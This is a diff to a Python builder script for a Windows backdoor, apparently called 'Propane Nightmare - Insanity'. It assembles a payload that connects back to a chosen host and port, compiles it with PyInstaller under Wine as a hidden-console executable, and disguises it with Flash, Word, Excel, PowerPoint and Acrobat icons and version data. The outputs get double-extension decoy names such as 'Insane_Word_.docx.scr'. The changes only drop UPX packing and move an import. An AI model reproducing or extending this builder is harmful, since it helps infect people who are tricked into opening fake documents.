@@ -38,7 +38,7 @@ def begin():
 
     payload = '#!/usr/bin/python\n'
     payload += '# -*- coding: iso-8859-15 -*-\n'
-    payload += '#Propane Nightmare - Insanity\n'
+    payload += 'from time import sleep\n'
     payload += 'import shutil\n'
     payload += 'import base64\n'
     payload += 'import socket\n'
@@ -48,7 +48,6 @@ def begin():
     payload += 'import sys\n'
     payload += 'import win32com.client\n'
     payload += 'from _winreg import *\n'
-    payload += 'from time import sleep\n'
     payload += 'HOST = ' + "'" + host + "'" + '\n'
     payload += 'PORT = ' + port + '\n'
     payload += "mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz2')" + '\n'
@@ -150,7 +149,7 @@ def asker():
         raise SystemExit
     elif choice.upper() == 'D':
         begin()
-        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico -F new.py')
+        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane -i Icons/flash.ico -F new.py')
         os.system('rm -Rf build new.spec new.py')
         name = 'Insane_Flash_.exe'
         os.rename('dist/new.exe', 'dist/' + name)
@@ -168,7 +167,7 @@ def asker():
             sys.exit(0)
     elif choice.upper() == '1':
         begin()
-        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico -F new.py')
+        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane -i Icons/flash.ico -F new.py')
         os.system('rm -Rf build new.spec new.py')
         name = 'Insane_Flash_.exe'
         os.rename('dist/new.exe', 'dist/' + name)
@@ -186,7 +185,7 @@ def asker():
             sys.exit(0)
     elif choice.upper() == '2':
         begin()
-        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.insane --upx-dir Utils/upx.exe -i Icons/word.ico -F new.py')
+        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.insane -i Icons/word.ico -F new.py')
         os.system('rm -Rf build new.spec new.py')
         name = 'Insane_Word_.docx.scr'
         os.rename('dist/new.exe', 'dist/' + name)
@@ -204,7 +203,7 @@ def asker():
             sys.exit(0)
     elif choice.upper() == '3':
         begin()
-        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.insane --upx-dir Utils/upx.exe -i Icons/excel.ico -F new.py')
+        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.insane -i Icons/excel.ico -F new.py')
         os.system('rm -Rf build new.spec new.py')
         name = 'Insane_Excel_.xlsx.scr'
         os.rename('dist/new.exe', 'dist/' + name)
@@ -222,7 +221,7 @@ def asker():
             sys.exit(0)
     elif choice == '4':
         begin()
-        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.insane --upx-dir Utils/upx.exe -i Icons/powerpoint.ico -F new.py')
+        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.insane -i Icons/powerpoint.ico -F new.py')
         os.system('rm -Rf build new.spec new.py')
         name = 'Insane_Power_.pptx.scr'
         os.rename('dist/new.exe', 'dist/' + name)
@@ -240,7 +239,7 @@ def asker():
             sys.exit(0)
     elif choice.upper() == '5':
         begin()
-        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.insane --upx-dir Utils/upx.exe -i Icons/acrobat.ico -F new.py')
+        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.insane -i Icons/acrobat.ico -F new.py')
         os.system('rm -Rf build new.spec new.py')
         name = 'Insane_AcrobatPDF_.pdf.scr'
         os.rename('dist/new.exe', 'dist/' + name)
@@ -302,7 +301,7 @@ def main():
                 raise SystemExit
             if choice.upper() == 'D':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico --hiddenimport socket -F new.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane -i Icons/flash.ico --hiddenimport socket -F new.py')
                 os.system('rm -Rf build new.spec new.py')
                 name = 'Insane_Flash_.exe'
                 os.rename('dist/new.exe', 'dist/' + name)
@@ -320,7 +319,7 @@ def main():
                     sys.exit(0)
             if choice == '1':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico -F new.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane -i Icons/flash.ico -F new.py')
                 os.system('rm -Rf build new.spec new.py')
                 name = 'Insane_Flash_.exe'
                 os.rename('dist/new.exe', 'dist/' + name)
@@ -338,7 +337,7 @@ def main():
                     sys.exit(0)
             elif choice == '2':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.insane --upx-dir Utils/upx.exe -i Icons/word.ico -F new.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.insane -i Icons/word.ico -F new.py')
                 os.system('rm -Rf build new.spec new.py')
                 name = 'Insane_Word_.docx.scr'
                 os.rename('dist/new.exe', 'dist/' + name)
@@ -356,7 +355,7 @@ def main():
                     sys.exit(0)
             elif choice == '3':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.insane --upx-dir Utils/upx.exe -i Icons/excel.ico -F new.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.insane -i Icons/excel.ico -F new.py')
                 os.system('rm -Rf build new.spec new.py')
                 name = 'Insane_Excel_.xlsx.scr'
                 os.rename('dist/new.exe', 'dist/' + name)
@@ -374,7 +373,7 @@ def main():
                     sys.exit(0)
             elif choice == '4':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.insane --upx-dir Utils/upx.exe -i Icons/powerpoint.ico -F new.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.insane -i Icons/powerpoint.ico -F new.py')
                 os.system('rm -Rf build new.spec new.py')
                 name = 'Insane_Power_.pptx.scr'
                 os.rename('dist/new.exe', 'dist/' + name)
@@ -392,7 +391,7 @@ def main():
                     sys.exit(0)
             elif choice == '5':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.insane --upx-dir Utils/upx.exe -i Icons/acrobat.ico -F new.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.insane -i Icons/acrobat.ico -F new.py')
                 os.system('rm -Rf build new.spec new.py')
                 name = 'Insane_AcrobatPDF_.pdf.scr'
                 os.rename('dist/new.exe', 'dist/' + name)
